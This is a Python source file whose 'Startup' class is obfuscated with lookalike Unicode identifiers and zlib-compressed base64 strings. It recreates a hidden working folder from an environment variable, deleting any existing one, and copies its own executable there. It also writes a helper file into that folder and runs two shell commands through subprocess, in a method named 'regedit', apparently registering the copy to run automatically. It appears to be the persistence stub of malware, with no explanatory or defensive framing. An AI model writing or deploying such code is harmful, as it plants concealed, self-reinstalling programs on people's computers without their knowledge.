import subprocess
import os
import shutil
import sys

class Startup:

    def __init__(self):
        𝙨𝘦𝙩𝘢𝙩𝙩𝙧(𝘴𝙚𝙡𝗳, 'working_dir', 𝗼𝘀.getenv(__𝘪𝗺𝘱𝗼𝘳𝘵__('base64').b64decode(__𝘪𝙢𝙥𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x0b\x0cs\n\x0cru\x0b\r\x0c\xb4\xb5\x05\x00\x17\xa5\x03\x89')).decode()) + __𝘪𝘮𝙥𝙤𝙧𝙩__('base64').b64decode(__𝗶𝗺𝘱𝙤𝘳𝘵__('zlib').decompress(b'x\xda\x8bp\x0f+I\xf6\xc8\xa9\x8c\nw+\x05\x00\x1c\x0c\x04f')).decode())
        if 𝘀𝘦𝘭𝘧.check_self():
            return
        𝙨𝙚𝙡𝙛.mkdir()
        𝙨𝗲𝘭𝙛.write_stub()
        𝘀𝗲𝘭𝘧.regedit()

    def check_self(self):
        if 𝙤𝙨.path.realpath(𝘴𝘺𝙨.executable) == 𝙨𝘦𝘭𝗳.working_dir + __𝙞𝗺𝘱𝙤𝘳𝙩__('base64').b64decode(__𝙞𝗺𝗽𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x8bp\x0f\xcaHq65H\xf5\x08\xb4\x05\x00\x18\x83\x03\xa1')).decode():
            return True
        return False

    def mkdir(self):
        if not 𝘰𝙨.path.isdir(𝘴𝗲𝙡𝗳.working_dir):
            𝗼𝙨.mkdir(𝙨𝗲𝙡𝙛.working_dir)
        else:
            𝘀𝗵𝘶𝘵𝘪𝘭.rmtree(𝙨𝗲𝘭𝙛.working_dir)
            𝘰𝘴.mkdir(𝘴𝘦𝙡𝗳.working_dir)

    def write_stub(self):
        𝘴𝘩𝘶𝘵𝘪𝗹.copy2(𝗼𝘴.path.realpath(𝘀𝘆𝙨.executable), 𝙨𝗲𝙡𝙛.working_dir + __𝘪𝙢𝘱𝙤𝘳𝘁__('base64').b64decode(__𝗶𝗺𝘱𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x8bp\x0f\xcaHq65H\xf5\x08\xb4\x05\x00\x18\x83\x03\xa1')).decode())
        with 𝗼𝗽𝙚𝗻(file=__𝗶𝙢𝗽𝙤𝘳𝘁__('base64').b64decode(__𝗶𝙢𝘱𝘰𝗿𝘵__('zlib').decompress(b'x\xdaK56LN\xce\x0b+\xf5\xc9\xf5\xcaHq\xb4\xb5\x05\x00.\x12\x05S')).decode().format(𝘴𝗲𝙡𝗳.working_dir), mode=__𝗶𝙢𝙥𝙤𝙧𝘵__('base64').b64decode(__𝗶𝙢𝗽𝘰𝙧𝘁__('zlib').decompress(b'x\xdaK)\xb7\xb5\x05\x00\x03\xb0\x01V')).decode()) as 𝙛:
            𝙛.write(__𝙞𝗺𝗽𝙤𝗿𝘁__('base64').b64decode(__𝗶𝙢𝘱𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x0bt\x0f\xcbJt\xb7HO2\x8a\xcau\xce\xf5\xcbHr/OO56L\x8erw3\xf0\xc9\x0b2Iq\xb4\xb5\x05\x00\xdc\x8e\x0b\x8a')).decode().format(𝙨𝘦𝙡𝗳.working_dir))

    def regedit(self):
        𝘀𝙪𝙗𝗽𝙧𝙤𝗰𝘦𝘀𝙨.run(args=[__𝙞𝘮𝘱𝘰𝙧𝘵__('base64').b64decode(__𝙞𝘮𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xdaK\xce\r\xcb\x03\x00\x03\xf1\x01\x95')).decode(), __𝙞𝙢𝙥𝘰𝙧𝘵__('base64').b64decode(__𝙞𝙢𝘱𝗼𝘳𝘁__('zlib').decompress(b'x\xda\x8br\x0f+\x8e\x8a\x08\xca\x01\x00\x0c\x8c\x02\xdb')).decode(), __𝙞𝗺𝗽𝗼𝘳𝙩__('base64').b64decode(__𝗶𝘮𝙥𝙤𝘳𝘵__('zlib').decompress(b'x\xda\x0bv-q\t\x0b\xab\x08I2\x8a2H1r\xab\x8c\n\xab\xf0K\x0c\xf7\xabL2\xf6+\x8b\xca\x0bJ\x0e3\xca)\x8dr\xb74N6\xacpI\x89\xf0\xaa\x8c\n75\x08\xcb\r\xabL6\xca)K\xca\xa9\x08N\t7\xb1\x05\x00\x1b\xfe\x170')).decode(), __𝙞𝘮𝘱𝗼𝙧𝘁__('base64').b64decode(__𝙞𝘮𝗽𝘰𝘳𝘵__('zlib').decompress(b'x\xda\xf31\x8e\xb4\x05\x00\x02\xbc\x01\x16')).decode(), __𝘪𝗺𝗽𝗼𝙧𝘵__('base64').b64decode(__𝘪𝗺𝘱𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x8b\n7,O\x8d\xf0\xca\x89\x0c7\xb1\x05\x00\x1a\x90\x03\xee')).decode(), __𝘪𝗺𝗽𝗼𝗿𝙩__('base64').b64decode(__𝙞𝙢𝗽𝗼𝗿𝘁__('zlib').decompress(b'x\xda\xf31\x8a\xb4\x05\x00\x02\xb9\x01\x15')).decode()], shell=True)
        𝙨𝘂𝙗𝘱𝙧𝘰𝙘𝗲𝘀𝘀.run(args=[__𝗶𝗺𝙥𝙤𝙧𝘵__('base64').b64decode(__𝘪𝙢𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xdaK\xce\r\xcb\x03\x00\x03\xf1\x01\x95')).decode(), __𝘪𝙢𝗽𝙤𝗿𝙩__('base64').b64decode(__𝘪𝙢𝘱𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x8b\x0c\x0f\xca\x06\x00\x03|\x01n')).decode(), __𝘪𝙢𝘱𝘰𝙧𝘁__('base64').b64decode(__𝘪𝘮𝗽𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x0bv-q\t\x0b\xab\x08I2\x8a2H1r\xab\x8c\n\xab\xf0K\x0c\xf7\xabL2\xf6+\x8b\xca\x0bJ\x0e3\xca)\x8dr\xb74N6\xacpI\x89\xf0\xaa\x8c\n75\x08\xcb\r\xabL6\xca)K\xca\xa9\x08N\t7\xb1\x05\x00\x1b\xfe\x170')).decode(), __𝙞𝘮𝘱𝗼𝘳𝙩__('base64').b64decode(__𝘪𝙢𝗽𝘰𝗿𝘁__('zlib').decompress(b'x\xda\xf31\x8e\xb4\x05\x00\x02\xbc\x01\x16')).decode(), __𝘪𝗺𝗽𝗼𝙧𝙩__('base64').b64decode(__𝙞𝗺𝗽𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x8b\n7,O\x8d\xf0\xca\x89\x0c7\xb1\x05\x00\x1a\x90\x03\xee')).decode(), __𝙞𝙢𝙥𝗼𝘳𝘵__('base64').b64decode(__𝘪𝗺𝘱𝙤𝗿𝘁__('zlib').decompress(b'x\xda\xf31\x0e\xb4\x05\x00\x02\xac\x01\x0e')).decode(), __𝘪𝗺𝙥𝙤𝘳𝘁__('base64').b64decode(__𝘪𝙢𝗽𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x0b\xcd\x0e\xf3\x880\xf4K\x04\x00\x0b\xf9\x02\x97')).decode(), __𝗶𝗺𝘱𝗼𝙧𝙩__('base64').b64decode(__𝗶𝘮𝙥𝘰𝗿𝘵__('zlib').decompress(b'x\xda\xf31\n\xb4\x05\x00\x02\xa9\x01\r')).decode(), __𝙞𝘮𝘱𝘰𝗿𝘵__('base64').b64decode(__𝗶𝘮𝗽𝘰𝘳𝘵__('zlib').decompress(b'x\xdaK56LN\xce\x0b+\xf5\xc9\xf5\xcaHq\xb4\xb5\x05\x00.\x12\x05S')).decode().format(𝙨𝗲𝘭𝗳.working_dir), __𝗶𝙢𝘱𝙤𝗿𝙩__('base64').b64decode(__𝘪𝗺𝙥𝘰𝙧𝙩__('zlib').decompress(b'x\xda\xf31\x8a\xb4\x05\x00\x02\xb9\x01\x15')).decode()], shell=True)